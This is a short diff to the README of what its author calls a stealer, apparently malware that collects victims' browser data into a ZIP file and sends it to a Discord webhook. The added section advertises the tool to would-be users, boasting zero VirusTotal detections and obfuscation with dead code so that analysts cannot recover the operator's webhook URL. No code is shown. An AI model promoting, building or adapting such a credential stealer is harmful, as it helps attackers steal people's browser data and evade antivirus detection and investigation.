@@ -69,6 +69,13 @@ If you didn't create a Discord webhook, create it. Then, run the ``build.bat`` f
 ![ZIP File](screenshots/zip.png)
 ![ZIP File - Browsers data](screenshots/zip_browser.png)
 
+## Why you should choose my stealer
+
+* It has zero VirusTotal detections, even with VM protect disabled.
+* Code built is obfuscated and minimized. I tried myself to un-obfuscate the code with websites on Google, but thanks to dead code, every single website just failed to un-obfuscate the code.
+  
+  TL;DR you don't have to worry about someone finding your webhook URL or something in the code 😊!
+
 ## Todo
 
 See [TODO.md](TODO.md) file.
